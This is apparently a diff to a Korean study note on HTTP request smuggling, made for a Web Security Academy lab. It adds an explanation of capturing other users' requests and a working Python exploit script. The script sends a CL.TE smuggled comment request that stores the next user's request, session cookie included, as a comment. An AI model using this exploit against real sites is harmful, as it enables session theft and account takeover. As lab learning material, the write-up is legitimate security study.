@@ -672,7 +672,87 @@ Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
 csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
 ```
 
-다른 사용자의 요청이 Back-end 서버에 의해 처리될 때, 그 요청은 smuggle된 요청에 붙게 되고 다른 사용자의 요청이 text로 저장됩니다.
+다른 사용자의 요청이 Back-end 서버에 의해 처리될 때, 그 요청은 smuggle된 요청에 붙게 되고 다른 사용자의 요청이 text로 저장됩니다. 사용자의 요청에는 민감한 정보가 포함되어 있을 수도 있습니다 : 
+
+``` http
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
+...
+```
+
+**NOTE :** 이 공격방법에는 한계가 있는데, 파라미터 구분자를 만나기 전까지의 정보만 얻을 수 있다는 것입니다. 만약 `GET` 메소드를 사용하는 요청에서 URL에 `&`를 포함하고 있으면, 필요한 정보들을 얻을 수 없을 수도 있습니다.
+
+**Lab: Exploiting HTTP request smuggling to capture other users' requests**
+
+**LAB Description :**
+
+Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. 
+
+다음 사용자의 요청이 어플리케이션에 저장되게 한 다음, 그 사용자의 쿠키를 이용해 접속하면 됩니다. 
+
+**PAYLOAD :**
+
+``` python
+import socket
+import requests
+import ssl
+
+HOST = "ac071f081f905a1b81bf42e30005007d.web-security-academy.net"
+PORT = 443
+
+def send_payload(data):
+    context=ssl.create_default_context()
+    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
+    ssl_sock.connect((HOST,PORT))
+    ssl_sock.send(data)
+    data = ssl_sock.recv(1024)
+    ssl_sock.close()
+
+    return data
+
+second_request  = b'POST /post/comment HTTP/1.1\r\n'
+second_request += b'Host: '+HOST.encode()+b'\r\n'
+second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+second_request += b'Content-Length: 830\r\n'
+second_request += b'Cookie: session=AGCd8ZxgfKGUA6th5RrmtM0AaZMeI6MI\r\n'
+second_request += b'\r\n'
+second_request += b'csrf=erlGB3vcRvPzF0zS6dMCZpCHNdhA5aF1&postId=1&name=jjjj&email=airmancho@kaa.com&website=http://blog.bbangjo.xyz&comment=123\r\n'
+
+first_request_body = b'7d\r\n'
+first_request_body += b'csrf=erlGB3vcRvPzF0zS6dMCZpCHNdhA5aF1&postId=1&name=first&email=first@aaaaa.com&website=http://blog.bbangjo.xyz&comment=first\r\n'
+first_request_body += b'0\r\n\r\n'
+
+first_request_header  = b'POST /post/comment HTTP/1.1\r\n'
+first_request_header += b'Host: '+HOST.encode()+b'\r\n'
+first_request_header += b'Content-Length: '+str(len(second_request)+len(first_request_body)).encode()+b'\r\n'
+first_request_header += b'Content-Type: application/x-www-form-urlencoded\r\n'
+first_request_header += b'Cookie: session=AGCd8ZxgfKGUA6th5RrmtM0AaZMeI6MI\r\n'
+first_request_header += b'Transfer-Encoding: chunked\r\n'
+
+
+smuggle_request = first_request_header + b'\r\n' + first_request_body + second_request
+
+data = send_payload(smuggle_request)
+
+print (f'{"[*] REQUEST":^10}')
+print (smuggle_request.decode())
+print ("{:^10}".format("[*] RESPONSE"))
+print (data.decode())
+```
+
+
+
+![image](https://user-images.githubusercontent.com/51329156/98478034-145cb680-223a-11eb-8e02-c4e1bf3ac6b5.png)
+
+
 
 ### UPDATING.. 
 
